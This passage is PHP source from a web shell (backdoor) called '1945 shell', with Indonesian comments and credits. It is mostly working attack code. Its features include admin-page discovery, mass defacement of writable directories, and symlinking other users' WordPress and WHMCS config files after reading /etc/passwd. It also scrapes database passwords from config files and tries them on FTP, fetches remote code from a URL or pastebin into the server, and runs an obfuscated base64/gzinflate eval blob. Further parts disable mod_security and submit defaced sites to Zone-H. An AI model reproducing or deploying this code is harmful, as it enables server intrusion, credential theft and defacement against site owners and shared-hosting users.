    'login.php','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php',
    'pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php',
    'adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php',
    'admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html',
    'login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html',
    'panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html',
    'adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php',
    'adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php',
    'panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php',
    'adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
    'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin.asp','admin/admin.asp',
    'admin_area/admin.asp','admin_area/login.asp','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp',
    'bb-admin/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','user.asp','webadmin/index.asp',
    'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp',
    'adminLogin.asp','admin/adminLogin.asp','home.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp',
    'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp',
    'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
    'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp');
    foreach($trying as $sec)
    {
    $urll=$url.'/'.$sec;
    if(urlExist($urll))
    {
    echo '<p align="center"><font color="00FF00">[+] FOUND!! --> <a href="'.$urll.'" target="_blank">'.$urll.'</a></font></p>';
    exit;
    }
    else
    {
    echo '<p align="center"><font color="#eee">[-] NOT FOUND --> '.$urll.'</font></p>';
    }   
    }
    echo 'Could not find admin page.[!]';
  }
  else
  {
    echo '<p>Invalid URL entered.[!]</p>';    
  }
    }

}elseif (isset($_GET['massdeface'])) {
	echo'<center>
	<h3> : Mass deface :</h3>
	<small> by indoXploit </small>';
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$_GET[massdeface]' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>JAYALAH INDONESIAKU</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}elseif (isset($_GET['conf'])) {

error_reporting(0);
?>
<form method=post>
<center>
<textarea type=hidden name=user><?php if(!file("/etc/passwd")){ echo"/etc/passwd  gak adda";}else{ echo file_get_contents('/etc/passwd');}?></textarea><br><br>
<input type=submit name=su value="GO GO GO!!"></form>
</center><?php

if(isset($_POST['su']))
 {
 mkdir('1945~',0777);
 $r = " \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('1945~/.htaccess','w');
fwrite($f,$r);
echo "<br><center><b><i><a href=1945~>TOUCH ME SENPAI</a></i></b></center>";
$usr=explode("\n",$_POST['user']);
foreach($usr as $uss)
{
 $us=trim($uss);
$r="1945~/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/blog/configuration.php',$r.$us.'..joomla');symlink('/home/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-congig.php',$r.$us.'..wordpress');symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/secure/configuration.php',$r.$us.'..securewhmcs');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-clients');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-client');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-billing');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-config');
}
echo'<center>berhasil!! <a href="1945~" target="_blank">touch me senpai..</a></center>';
}
}elseif (isset($_GET['ctools'])) {
	echo'
<center>
<h3>: Create Your Tools :</h3>
<p><font color=white> NB : Tools ini akan mengambil script dari URL format .txt atau dari pastebin</font></p>
	<form method="post">
	<table><tr>
	<th colspan=2>Import from</th>
	</tr><tr><td>
	URL : </td><td><input type="text" name="url" placeholder="http://site.com/1.txt" style="width:200px"></td></tr><tr>
	<td>
	PASTEBIN :</td><td><input type="text" name="pastebin" placeholder="4hIh93nJ" style="width:200px"></td></tr>
<tr><td>save as:</td><td><input type="text" name="pname" value="'.$_GET['ctools'].'/mytools.php" style="width:200px" required></td></tr>
<tr><th colspan=2>
	<input type="submit" value="create!" name="ctools"></th></tr>
	</table>
	</form>';
if(isset($_POST['ctools'])){
	if(!empty($_POST['url'])){
		$st=file_get_contents(htmlspecialchars($_POST['url']));
		$fp=fopen($_POST['pname'],'w');
		if(fwrite($fp,$st)){
			echo "done!! --> <a href='?act=".$_GET['act']."&src=".$_POST['pname']."' target='_blank'>click here</a>";
		}
		fclose($fp);
	}else{
		if(!empty($_POST['pastebin'])){
			$st=file_get_contents(htmlspecialchars("http://pastebin.com/raw/".$_POST['pastebin']));
		$fp=fopen($_POST['pname'],'w');
		if(fwrite($fp,$st)){
			echo "done!! --> <a href='?act=".$_GET['act']."&src=".$_POST['pname']."' target='_blank'>click here</a>";
		}
		fclose($fp);
	}
}
}
}elseif (isset($_GET['stringtools'])) {
	echo' <center>
	<h3>: String Tools :</h3>
	[<a href="?act='.$_GET['act'].'&replace='.$_GET['stringtools'].'">Auto replace String</a>]<br>
	<font color=white> NB : tools ini adalah perbaikan dari enc0de dec0de script dan saya tambahkan coventer</font>
	<br>
<form method="post">
<textarea name="e" style="width:77%;height:300px" class="form-control" placeholder="input string here [!]">
</textarea><br><br>

	<select name="opt" class="form-control" style="width:70%">
	 	<optgroup label="Converter">
	<option value="dechex">Decimal to Hexa</option> 	<option value="hexdec">Hexa to Decimal</option>
<option value="decoct">Decimal to Octa</option>
<option value="octdec">Octa to Decimal</option>	 
	 	<option value="decbin">Decimal to Binary</option>	
	 	<option value="bindec">Binary to Decimal</option>	
	 	 <option value="hexbin">Hexa to Binary</option>	
<option value="binhex">Binary to Hexa</option>
</optgroup><optgroup label="encode&decode">
	<option value="url">URL</option> 	<option value="base64">base64</option>
<option value="urlbase64">URL - base64</option>
<option value="cuu">Convert_uu</option>
<option value="sgzcuus64">str_rot13 - gzinflate - convert_uu - str_rot13 - base64 </option>
<option value="gz64">gzinflate - base64</option>	 
	 	<option value="sgz64">str_rot13 - gzinflate - base64</option>	
	 	<option value="s64">str_rot13 - gzinflate - str_rot13 - base64</option>	
<option value="sb64">str_rot13 - base64 </option>
	 	 <option value="64url">URL - base64</option>	
<option value="64u64u">URL - base64 - url - base64</option>
<option value="ss64"> base64 - str_rot13 - str_rot13</option>
</optgroup>
	</select>	
	<br> 
<input type="submit" value="Convert!" name="c" class="btn btn-success btn-sm">
<input type="submit" value="enc0de" name="en" class="btn btn-primary btn-sm">
<input type="submit" value="dec0de" name="de" class="btn btn-danger btn-sm">
</form>
	
	';
	 	$a = $_POST['e'];	
	 	$o = $_POST['opt'];
	if(isset($_POST['c'])){
	switch($o){
		case'dechex';
		$s= dechex($a);
		break;
		case'dechex';	
		$s= hexdec($a);
		break;
		case'decoct';
		$s= decoct($a);
		break;
		case'octdec';
		$s= octdec($a);
		break;
		case'decbin';
		$s= decbin($a);
		break;
		case'bindec';
		$s= bindec($a);
		break;
		case'hexbin';
		$s= hex2bin($a);
		break;
		case'binhex';
		$s= bin2hex($a);
		break;
		}
echo'<br>:: OutPut ::<br><textarea style="width:77%;height:300px ">'.$s.'</textarea>';
		}elseif(isset($_POST['en'])){
			switch($o){
				case'url';
				$r=urlencode($a);
				break;
				case'base64';
				$r=base64_encode($a);
				break;
				case'urlbase64';
				$r=urlencode(base64_encode($a));
				break;
				case'gz64';
				$r=base64_encode(gzdeflate($a));
			
			break;
			case'sgz64';
			$r=base64_encode(gzdeflate(str_rot13($a)));
			break;
			case's64';
			$r=(base64_encode(str_rot13(gzdeflate(str_rot13($a)))));
		break;
		case'sb64';
		$r=base64_encode(str_rot13($a));
		break;	
		case'64url';
		$r=base64_encode(urlencode($a));
		break;
		case'64u64u';
		$r=base64_encode(urlencode(base64_encode(urlencode($a))));
		break;
		case'cuu';
		$r=convert_uuencode($a);
		break;
	 case'sgzcuus64';
	 $r=base64_encode(str_rot13(convert_uuencode(gzdeflate(str_rot13($a)))));
	 break;
	 case'ss64';
	 $r=str_rot13(str_rot13(base64_encode($a)));
	 break;
		}
			echo'<br>:: OutPut::<br><textarea style="width:77%;height:300px" >'.$r.'</textarea>';
		
		}
//Dec0de
	if(isset($_POST['de'])){
		switch($o){
		 	case'url';
				$r=urldecode($a);
				break;
				case'base64';
				$r=base64_decode($a);
				break;
				case'urlbase64';
				$r=base64_decode(urldecode($a));
				break;
				case'gz64';
				$r=gzinflate(base64_decode($a));
			
			break;
			case'sgz64';
			$r=str_rot13(gzinflate(base64_decode($a)));
			break;
			case's64';
			$r=str_rot13(gzinflate(str_rot13(base64_decode($a))));
		break;
		case'sb64';
		$r=str_rot13(base64_decode($a));
		break;	
		case'64url';
		$r=urldecode(base64_decode($a));
		break;
		case'64u64u';
		$r=urldecode(base64_decode(urldecode(base64_decode($a))));
		break;
	 case'cuu';
		$r=convert_uudecode($a);
		break;
	 case'sgzcuus64';
	 $r=str_rot13(gzinflate(convert_uudecode(str_rot13(base64_decode($a)))));
	 break; 	
	 case'ss64';
	 $r=base64_decode(str_rot13(str_rot13($a)));
		}
		$rx = htmlspecialchars($r);
			echo'<br>:: OutPut::<br><textarea style="width:77%;height:300px" >'.$rx.'</textarea>';
		
	}

}elseif (isset($_GET['about'])) {
	?>
<center>
<h2 style="font-family:courier;">1945 shell <br>
<small style="border-bottom:1px solid #fff;"> c0dename : freedom is real!!</small></h2>
<img src="https://2.bp.blogspot.com/-fE4-9A9N5Gk/V1h9fkMT75I/AAAAAAAAF6o/gz0oZg-G6kkB-VL8nIxsDocraNsiYdb2QCLcB/s320/Logo%2BHUT%2BRI%2BKe-71%2BTahun%2B2016.jpg" width="500" height="300">
<br>
<table>
<tr><td>PROKLAMASI</td><td>
<marquee scrollamount=5><i><b><font color=white>
    Kami bangsa Indonesia dengan ini menjatakan kemerdekaan Indonesia.
    Hal2 jang mengenai pemindahan kekoeasaan d.l.l., diselenggarakan
    dengan tjara saksama dan dalam tempoh jang sesingkat-singkatnja.  Jakarta 17-08-'05 Atas nama bangsa indonesia : Soekarno - Hatta</marquee></td></tr></table>
<h3 style="text-shadow:2px 3px 3px #fff;"> : 1945 shell ~ 71th INDONESIA KERJA NYATA:</h3>
<p>Assalamualaikum wr.  wb.</p>
<pre>
okey.. kawan gak banyak omong!
shell (backd00r) ini <font color=lime>bukan rec0de dari shell manapun dan gak semuaNya saya c0ding sendiri </font> ada beberapa tools dari google dan pastebin,
kenapa nama shell ini "1945" karena saya ingin membuat karya pada hari kemerdekaan indonesia (code kemerdekaan 17081945),
udah gitu aja~ kalo ada yang gk suka atau keluhan bisa priksa ke dokter ;'v [<a href='https://facebook.com/JKT48.co' target='_blank'>dokter tamvan</a>] atau [<a href='https://twitter.com/alinmansby' target='_blank'>dokter ganteng</a>]
+------------------------------------------------------------------------------------------------------------+
   1945 shell by : shutdown57
: Greet Thanks :
-- Tuhan YME -- Pahlawan perjuangan Indonsia --
-- [-]sh4d0w_99[!] -- MRG#7 -- sunr15 -- kinayayume48 -- root@hex  -- xXx-ID -- pastebin.com -- google.com -- 
+------------------------------------------------------------------------------------------------------------+
<FONT COLOR=WHITE>
UCAPAN TERIMAKASIH BUAANYYAK KEPADA YANG TELAH MENGHARGAI DAN MENGGUNAKAN KARYA ANAK INGUSAN INI :), HANYA ITU YANG BISA SAYA SAMPAIKAN.
</FONT>
<pre style="color:pink">
<b><i>Quotes :</b></i>
<br>
<b>"Jangan sekali-sekali meragukan kemerdekaan bangsa INDONESIA , karna itu berarti bahwa anda tidak menghargai jasa para pahlawan yang telah berjuang dan mendapatkan kemerdekaan kita :)"</b>
"Cintailah sesuatu yang berasal dari tanah kelahiranMu sendiri"
"Jangan sekali-sekali menghina,menghujat,mencaci maki budayaMu sendiri! :) hanya orang tidak waras yang melakukanNya"
"Siapa yang harus di salahkan ketika SDM kita rendah?,salahkanlah diri kalian masing-masing! karena kalian juga termasuk SDM bangsa indonesia"
<i>./shutdown57 & kinayayume48</i>
</pre>
SEKIAN.
---------+
</pre>
	<?php
}elseif (isset($_GET['unzip'])) {
echo'
<center>
<h3>: Unzip Files :</h3>
<br>
<table border=1>
<tr><td>file zip</td><td>Target Dir</td>
</tr>
<tr><td>
<form method="post">
<input type="text" name="filezip" value="'.$_GET['unzip'].'/file.zip" >
</td><td>
<input type="text" name="dirzip" value="'.$_GET['unzip'].'/" >
</td></tr>
</table>
<input type="submit" name="ext" value="unzip!!">
</form>';

if(isset($_POST['ext'])){
	$zip = new ZipArchive;
$res = $zip->open($_POST['filezip']);

if ($res === TRUE) {

$zip->extractTo($_POST['dirzip']);

$zip->close();
         echo "<br>DONE..!! extracted !";
     } else {

echo "failed";
     }
}
}elseif (isset($_GET['download'])) {
	ob_clean();
	$dunlut = $_GET['download'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($dunlut).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($dunlut));
	readfile($dunlut);
	exit;
 
}elseif (isset($_GET['mail'])) {
	$e=function_exists('mail');
	if($e){
	echo "
	<center>
	<h3>: mail sender :</h3>
	<br>
	<form method='post' >
	<table border=1>
	<tr>
	<td>from :</td><td><input type='text' name='from' value='shutdown57@indonesia.go.id' ></td></tr>
	<tr><td>For:</td><td><input type='text' name='for' value='admin@".$_SERVER['HTTP_HOST']."'></td></tr>
	<tr><td>Subject:</td><td><input type='text' name='subject' value='patch ur site!' ></td></tr>
	</table>
	<textarea name='cont' style='width:500px;height:300px'>please..patch ur face! ur face is bad :p </textarea>
	<br>
	<input type='submit' name='sent' value='send!!' >
	</form>";

}else{
	echo" mail() function does not exists in this website!";
}
if(isset($_POST['sent'])){
	if(mail($_POST['for'],$_POST['subject'],$_POST['cont'],$_POST['from'])){
		echo "send!!".$_POST['for'];
	}else{
		echo"failed !!!";
	}
}
}elseif (isset($_GET['kuchiyose'])) {
echo "
<center>
<h3>: Kuchiyose No Jutsu :</h3>
<br>
<p><font color=white>NB : Jika ada error/script tidak muncul ,ganti IP mu atau pake anonymoX<br>
(saran IP USA ) </font></p>
<table><tr><td>
<pre style='text-align:left;'>
                   [<a href='?act=".$_GET['act']."&kuchiyose=wso'>WSO shell</a>]
                 [<a href='?act=".$_GET['act']."&kuchiyose=jkt48'>JKT48 priv8 shell</a>]
               [<a href='?act=".$_GET['act']."&kuchiyose=bejak'>b374k shell</a>]
             [<a href='?act=".$_GET['act']."&kuchiyose=indoxploit_shell'>indoXploit shell</a>]
           [<a href='?act=".$_GET['act']."&kuchiyose=andela'>andela priv8 shell</a>]
         [<a href='?act=".$_GET['act']."&kuchiyose=injection'>1n73ction shell </a>]
       [<a href='?act=".$_GET['act']."&kuchiyose=sbh'>Surabaya BlackHat shell </a>]
    [<a href='?act=".$_GET['act']."&kuchiyose=bh'>BlackHat shell</a>]
    [<a href='?act=".$_GET['act']."&kuchiyose=c99'>C99 shell</a>]
      [<a href='?act=".$_GET['act']."&kuchiyose=r57'>r57 shell</a>]
        [<a href='?act=".$_GET['act']."&kuchiyose=adminer'>adminer</a>]
          [<a href='?act=".$_GET['act']."&kuchiyose=terminal'>terminal</a>]
            [<a href='?act=".$_GET['act']."&kuchiyose=root'>ByPass R00t Path</a>]
              [<a href='?act=".$_GET['act']."&kuchiyose=pastebin'>Pastebin auto post</a>]
                [<a href='?act=".$_GET['act']."&kuchiyose=whmcs'>WHMCS killer</a>]
                  [<a href='?act=".$_GET['act']."&kuchiyose=bypass_shell'>Bypass Shell To .JPG Files</a>]
</pre>
</td><td>
<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_map_of_Indonesia.svg/2000px-Flag_map_of_Indonesia.svg.png' width='100%' height='100%'>
</td></tr>
</table>
<br><br>
<p><b><i><font color=white>MOHON MAAF JIKA SAYA NEMCANTUMKAN SCRIPT ANDA TANPA IJIN :V </font></b></i></p>";
}elseif (isset($_GET['cpbrute'])) {
	 echo '';
    ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
    set_time_limit(0);
   
    @$passwd = fopen('/etc/passwd','r');
    if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
    $pub = array();
    $users = array();
    $conf = array();
    $i = 0;
    while(!feof($passwd))
    {
        $str = fgets($passwd);
            if ($i > 35)
            {
                $pos = strpos($str,':');
                $username = substr($str,0,$pos);
                $dirz = '/home/'.$username.'/public_html/';
                if (($username != ''))
                {
                    if (is_readable($dirz))
                    {
                        array_push($users,$username);
                        array_push($pub,$dirz);
                    }
                }
              }
        $i++;
    }
   
    echo '<h3>: cPanel bruteForce</h3>
    <br>
    <br>
    <center>
    <textarea>';
    echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
    echo "[+] Founded ".sizeof($pub)." readable public_html directories\n";
    echo "[~] Searching for passwords in config files...\n\n";
    foreach ($users as $user)
    {
        $path = "/home/$user/public_html/";
        read_dir($path,$user);
    }
    echo "\n[+] Done !\n";
    function read_dir($path,$username)
    {
        if ($handle = opendir($path))
        {
            while (false !== ($file = readdir($handle)))
            {
                $fpath = "$path$file";
                if (($file != '.') and ($file != '..'))
                {
                    if (is_readable($fpath))
                    {
                        $dr = $fpath."/";
                        if (is_dir($dr))
                        {
                            read_dir($dr,$username);
                        }
                        else
                        {
                             if (
                                 ($file=='config.php')
                             or ($file=='config.inc.php')
                             or ($file=='conf.php')
                             or ($file=='settings.php')
                             or ($file=='configuration.php')
                             or ($file=='wp_config.php')
                             or ($file=='wp-config.php')
                              or ($file=='inc.php')
                             or ($file=='setup.php')
                             or ($file=='dbconf.php')
                             or ($file=='dbconfig.php')
                             or ($file=='db.inc.php')
                             or ($file=='dbconnect.php')
                             or ($file=='connect.php')
                             or ($file=='common.php')
                             or ($file=='config_global.php')
                             or ($file=='db.php')
                             or ($file=='connect.inc.php')
                             or ($file=='e107_config.php')
                             or ($file=='dbconnect.inc.php'))
                            {
                                $pass = get_pass($fpath);
                                if ($pass != '')
                                {
                                    echo "[+] $fpath\n$pass\n";
                                    ftp_check($username,$pass);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    function get_pass($link)
    {
        @$config = fopen($link,'r');
        while(!feof($config))
        {
            $line = fgets($config);
            if (strstr($line,'pass')
            or strstr($line,'pwd')
            or strstr($line,'db_pass')
            or strstr($line,'dbpass')
            or strstr($line,'passwd'))
            {
                if (strrpos($line,'"'))
                {
                    preg_match("/(.*)[^=]\"(.*)\"/",$line,$pass);
                    $pass = str_replace("]=\"","",$pass);
                }
     
                else
                    preg_match("/(.*)[^=]\'(.*)\'/",$line,$pass);
                    $pass = str_replace("]='","",$pass);
                return $pass[2];
            }
        }
    }
    function ftp_check($login,$pass)
    {
        @$ftp = ftp_connect('127.0.0.1');
        if ($ftp)
        {
            @$res = ftp_login($ftp,$login,$pass);
            if ($res)
            {
                echo '[FTP] '.$login.':'.$pass."  Success !\n\n";
     
    eval(gzinflate(base64_decode('rVPBbtswDL0b8D9ohoEmgFtUzmVo1qHDkC49rDPiZId2RaDITOrVEQ3JQdEN+6D95UTJSbHB2cnxQeIj3yMjknGBW1EqdsniZT6ZfZ3M7k+m83m2nH7J5ycP4zCI65Rbd8r9PaV76u/nb51lD7Kld64NyiesQQ1ir50QK4lBa4XuMI1O+Pmw5fBjHH6c4xN3sqyrm0dfuR68cXUOw+BnLPhlNNEadTT+FQZQGdij+U5KMCYar2WFBgaeQ1GvGtxrpJ0aabcG/0fDFutVRp0qo24VYnkd6oKxzYvC4LSv3zcVBh9roaBii7oQDbAbtUZ2X+MzaCjY6oV9WtzcTnI2A4kFEPBZmKflVmxKWQp1xx4YifRa0RRNwy5Y22hCFgY0IRVuPJAJYwio7dl7/g+2DXXDMtSN+3N5PrW5nGknhpDrefaKpITIzL3iARz1XtVvu3yct/1I/urCD5v10LCZHZ2VUEXZ3PVcQ0Qb2aDdxkiozaYEgVpcvYhHxDOJW+fWIMv6vxFmt/oOsqGY9tHovU3eTqCLeQRRgDYUc61xe8F2zvdOwbO5kvWpN89KO6zviWDnpBrY0pK9ekK7kux1hocQV97RqD8=')));
     
                echo '[SSH] Port'   .':' .$a1. "  !\n\n";
                echo '[FTP] Port'   .':' .$a2. "  !\n\n";
                echo '[cPanel] Port' .':' .$a3. "  !\n\n";
     
            }
            else ftp_quit($ftp);
        }
    }
    echo '</textarea><br><br><b>BruteForce Completed ...</b>';
}elseif (isset($_GET['copy'])) {
echo'
<center>
<h3>: copy file :</h3>
<br>
<form method="post">
file :<input type="text" name="copy" value="'.$_GET['act'].'" style="width:200px"> copy to:
<input type="text" name="copied" value="'.$_GET['act'].'/copy-" style="width:200px">
<input type="submit" name="cop" value=">>">
</form>';
if(isset($_POST['cop'])){
	if(copy($_POST['copy'],$_POST['copied'])){
		echo" done!! copied! <a href='?act=".$_GET['act']."&src=".$_POST['copied']."'>".$_POST['copied']."</a>";
	}
}
}elseif ($_GET['act']=='logout') {
	session_destroy();
	echo'<script>
	alert("bye.. !!!!!!!!");
	window.location.href="?";
	</script>';
}elseif (isset($_GET['phpinfo'])) {
		phpinfo();
}elseif (isset($_GET['zoneh'])) {
?>
<center>
<h3>: Zone-H Mass Notifer :</h3>
</center>
<form method="post">
<center>
<input type="text" name="depecer" style="width:500px" placeholder="defacer">
<br>
<textarea name="url"  placeholder="http://korban.com" style="width:500px;height:300px;"></textarea><br>

<input type="submit" name="go" value="subMitt" >
</form>
<?php
$url = explode("\r\n", $_POST['url']);
$go = $_POST['go'];
function kirim($target,$hacker) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, "http://zone-h.org/notify/single");
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, array(
		  	"defacer" => $hacker,
		  	"domain1" => $target,
		  	"hackmode" => "1",
		  	"reason" => "1",
		  	));
	$res = curl_exec($ch);
		  curl_close($ch);
	return preg_match("/<font color=\"red\">OK<\/font><\/li>/", $res);
}
if($go) {
	foreach($url as $sites) {
		if(kirim($sites,$_POST['depecer'])) {
			echo "<br>[ OK ] => $sites <br>";
		} else {
			echo "<br>[ ERROR ] => $sites <br>";
		}
	}
}

}elseif($_GET['mobile']){
	if(!$_SESSION['responsive']){
$_SESSION['responsive']="<meta name='viewport' content='width=device-width,inintial-scale=1'>";
}else{
echo $_SESSION['responsive'];
}
}elseif($_GET['mobile_off']){
unset($_SESSION['responsive']);
echo"<script>
alert('mode responsive :OFF');
window.location.href='?responsive=off';
</script>";

}elseif($_GET['theme']){
	?>
	<br><br>
	<center>
	<h1>.:: change theme and become more comfortable ::.</h1>
	<small>c0ded by shutdown57</small>
	
	<br><br>
	<table class="tbl_exp" border=1><thead id="thead">
	<th>FONT SIZE</th><th>FONT COLOR</th><th>PUBLIC FONT COLOR</th><th>BACKGROUND</th><th>REPONSIVE MODE</th></thead>
	<tbody>
	<tr><td>
	<form method="post">
 <input type="number" name="fz" value="<?=$fz;?>"><input type="submit" name="submitfz" value=">>"></form></td><td>
 <form method="post">
<input type="color" name="color" value="<?=$col;?>"><input type="submit" name="submitcol" value=">>"></form></td><td>
<form method="post">
<input type="color" name="pcolor" value="<?=$pcol;?>"><input type="submit" name="submitpc" value=">>"></form></td><td>
<form method="post">
<input type="color" name="bgcolor" value="<?=$bg;?>"><input type="text" value="<?=$bg;?>" name="bgcolor"><input type="submit" name="submitbg" value=">>"></form></td><td><?php echo $resmod;?></td></tr></tbody></table>
<h3>[<a href='?act=<?=$d;?>&reset=<?=$d;?>'>DEFAULT THEMES</a>]</h3>
</center>
<pre>

FONT SIZE         : mengubah ukuran font(tulisan) ,semakin besar angka semakin besar pula ukuran font.
FONT COLOR        : mengubah warna font (bukan link).
PUBLIC FONT COLOR : mengubah semua warna font(termasuk link).
BACKGROUND        : mengubah warna background atau bisa dengan gambar di isi dengan :
                    ex : url('http://google.com/gambar.jpg')
REPONSIVE MODE    : mode saat menyesuaikan ukuran layar pengguna.

</pre>
<?php
}elseif($_GET['reset']){
unset($_SESSION['fz']);
unset($_SESSION['col']);
unset($_SESSION['pcol']);
unset($_SESSION['bg']);
echo "<script>window.location.href='?'</script>";
}elseif (isset($_GET['replace'])) {
	echo"
	<center>
	<h3>: auto replace string :</h3>
	<P>NB :  gunakan otak kalian ! </p>
	<br>
	<form method='post'>
		<input type='submit' name='sstr' value='replace all'>
	<table style='border-collapse:collapse;border:1px solid #eee;' border=1><tr><td>
	<textarea name='str' style='width:600px;height:200px;' required>Your string here / string anda sini</textarea></td><td>
	<textarea name='str2' style='width:600px;height:200px;' required>string will u replace / string yang  ingin anda ganti</textarea></td></tr>
	<tr><td>
	<textarea name='str3' style='width:600px;height:200px;' required>string replace /ganti string</textarea></td><td>
	<form>";
	if(isset($_POST['sstr'])){
		$rep=str_replace($_POST['str2'],$_POST['str3'],$_POST['str']);
		if($rep){
			echo'
			<textarea style="width:600px;height:200px;">'.$rep.'</textarea></td></tr></table>';
		}
	}
}
}else{
	?>
<table class="tbl_exp" border='1'>
<tr id="thead">
<th>No</th><th>^</th><th>Name</th><th>Permission</th><th>Size</th><th>Last Modified</th><th>action</th>
</tr>

<?php
if(isset($_GET['45'])){
$d=$_GET['45'];
}else{
$d=getcwd();
}
$d=str_replace('\\','/',$d);
$sdir=scandir($d);
$no=1;
echo'
<form method="post">
<tr class="hover">

	<td style="width:25px;max-width:48px;">-</td><td style="width:20px">^</td><td style="width:20%;max-width:500px;">
